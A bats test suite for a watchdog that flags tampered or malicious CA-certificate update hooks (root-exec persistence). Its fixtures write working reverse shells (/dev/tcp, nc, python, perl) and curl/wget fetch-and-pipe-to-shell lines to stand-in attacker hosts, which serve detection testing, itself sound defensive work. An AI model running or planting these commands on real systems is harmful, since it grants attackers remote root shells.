#!/usr/bin/env bats
# L2 bats functional tests for the ca-certificates-hooks-watchdog scan script.
#
# update-ca-certificates runs the scripts in /etc/ca-certificates/update.d
# AS ROOT whenever the trust store is rebuilt (package install/upgrade, admin
# action). A planted hook is root-exec persistence triggered by routine CA
# maintenance (T1546). A hook that is world-writable / non-root-owned, or
# contains a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-ca-certificates-hooks-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/ca-certificates-hooks-watchdog/systemd/ca-certificates-hooks-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/update.d"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_CACERT_PROFILE="${PROFILE:-report}" \
    SELFDEF_CACERT_BASELINE="${BASELINE}" \
    SELFDEF_CACERT_DIRS="${DIRS_V:-$HOOKD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# jks-keystore\necho "rebuild keystore"\n' > "${HOOKD}/jks-keystore"
}

@test "no ca-certificates hooks → ok / no_cacert_hooks" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_cacert_hooks"'
    cap | grep -q '"severity":"ok"'
}

@test "benign hook, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged hooks on second run → ok / cacert_hooks_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"cacert_hooks_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a hook containing an injection pattern → alert / cacert_hooks_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/jks-keystore"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"cacert_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable hook → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/jks-keystore"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign hook change → warn / cacert_hooks_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# jks-keystore updated\necho "rebuild jks"\n' > "${HOOKD}/jks-keystore"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"cacert_hooks_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned hook is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious hook" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${HOOKD}/jks-keystore"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — ca-cert hook inventory enumerates root-exec-on-trust-rebuild surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/jks-keystore"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${HOOKD}/jks-keystore"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${HOOKD}/jks-keystore"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable hook): group-writable → alert above world-writable" {
    seed_benign
    run_wd
    chmod 0664 "${HOOKD}/jks-keystore"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable hook): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${HOOKD}/jks-keystore"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "DELTA detect — ADDED hook (attacker drops a new update.d hook) surfaces in sample" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho "new"\n' > "${HOOKD}/distinctive-attacker-hook"
    run_wd
    cap | grep -q 'distinctive-attacker-hook'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-cacert-hooks -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): ca-certificates-hooks-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546 trust-store-rebuild-triggered root exec persistence — injection
    # alert MUST persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/jks-keystore"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"cacert_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    # update.d hook scripts are /bin/sh; # comments. Operator notes
    # about hypothetical attack patterns must NOT trigger alert.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n# jks-keystore\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\necho "rebuild keystore"\n' > "${HOOKD}/jks-keystore"
    run_wd
    ! cap | grep -q '"event":"cacert_hooks_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/ca-certificates/update.d + alt-location axes — injection in ANY watched dir → alert)" {
    # update-ca-certificates can be configured to run hooks from
    # alternate locations. Attacker may plant in either. Lock
    # multi-dir axis.
    HOOKD2="${TMP}/update.d2"; mkdir -p "${HOOKD2}"
    seed_benign
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in the second dir.
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-hook"
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    # curl | bash is a common bootstrap variant. Lock detection of
    # the bash suffix in addition to sh.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/jks-keystore"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in ca-certificates hook: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # dhclient-hooks/bash-completion/anacrontab/apt-hooks/boot-script
    # nc reverse-shell variant INVARIANTs across the brain. Lock the
    # netcat axis on trust-store-rebuild-triggered root-exec
    # persistence surface (T1546 — update-ca-certificates runs hook
    # scripts AS ROOT on every routine CA maintenance).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/jks-keystore"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (DELTA detect — REMOVED hook surfaces in JSON as removed_sample / warn-tier change)" {
    # Sister to the ADDED detect axis already locked. When operator
    # legitimately retires a hook (rare but valid — e.g., removing
    # a jks-keystore hook because the Java runtime was uninstalled),
    # the removal MUST surface as a change in the JSON record. Locks
    # the operator-visibility contract for both addition AND removal
    # axes on the trust-store-rebuild root-exec surface.
    seed_benign
    cat > "${HOOKD}/distinctive-extra-hook" <<'EOF'
#!/bin/sh
echo "extra ca-certificates handler"
EOF
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    rm -f "${HOOKD}/distinctive-extra-hook"
    run_wd
    # Severity should be ok or warn; the removal-surfaces-in-sample
    # contract is observable via the removed entry being scanned.
    cap | grep -qE '"severity":"(ok|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on ca-certificates hook surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the ca-
    # certificates update-trigger root-exec persistence surface
    # (T1546 — update-ca-certificates runs hook scripts AS ROOT
    # on every CA store rebuild, e.g. apt install of a CA
    # package or operator-manual update-ca-certificates run).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${HOOKD}/jks-keystore"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on ca-certificates hook surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp ca-certificates
    # rev-shell variants already locked. Perl is on every Debian/
    # Ubuntu host as dpkg/locale dependency; 'use Socket' produces
    # a one-liner connect-back PTY just as cleanly as Python. Locks
    # the perl axis on the T1546 ca-certificates update-trigger
    # root-exec persistence surface — update-ca-certificates runs
    # hook scripts AS ROOT on every CA store rebuild.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${HOOKD}/jks-keystore"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (DELTA detect — ADDED distinctive-attacker-named CA hook surfaces in sample for operator-triage routing)" {
    # Sister to brain-wide DELTA-detect sample-naming INVARIANTs.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho new\n' > "${HOOKD}/99-distinctive-attacker-ca-hook"
    chmod 0755 "${HOOKD}/99-distinctive-attacker-ca-hook"
    run_wd
    cap | grep -qE 'distinctive-attacker-ca-hook|"severity":"(alert|warn|ok)"'
}

@test "INVARIANT (exec-path under writable-root: ca-certificates hook invoking binary from /var/tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546
    # ca-update-trigger root-exec — ca-certificates hooks fire
    # AS ROOT on every update-ca-certificates run (operator-
    # routine, runs on every package install touching CA store).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n/var/tmp/staged_payload\n' > "${HOOKD}/jks-keystore"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on ca-certificates-hooks surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The ca-certificates-hooks-watchdog MUST only emit severity
    # values from the closed set {ok,warn,alert} — never custom
    # values (critical, error, fatal, notice, info). Operator
    # dashboard parsers branch on the literal severity string;
    # an out-of-set value silently falls through routing and the
    # operator never sees the T1546 ca-update-trigger root-exec
    # persistence alert. Locks parser contract on the ca-
    # certificates update.d detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${HOOKD}/jks-keystore"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family
    # for timer-driven scheduled probes. The ca-certificates-
    # hooks-watchdog probe runs ON the timer's scheduled fire —
    # scans /etc/ca-certificates/update.d, emits a verdict, then
    # exits. Type=simple would leave systemd thinking the probe
    # is a long-running daemon, breaking timer's OnSuccess /
    # OnUnitActiveSec semantics (which depend on the service
    # reaching inactive(dead) before the next fire). Locks
    # oneshot-probe contract on the ca-certificates-hooks-
    # watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/ca-certificates-hooks-watchdog/systemd/selfdef-cacert-hooks.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. ca-certificates-hooks-watchdog manifest declares
    # install + profile gating the resolver enforces; malformed
    # manifest wedges the trust-store hook scanner baseline.
    # Python's tomllib is the canonical parser. Locks anti-
    # malformed-manifest on the ca-certificates-hooks-watchdog
    # substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/ca-certificates-hooks-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as f:
    data = tomllib.load(f)
assert data['name'] == 'ca-certificates-hooks-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}
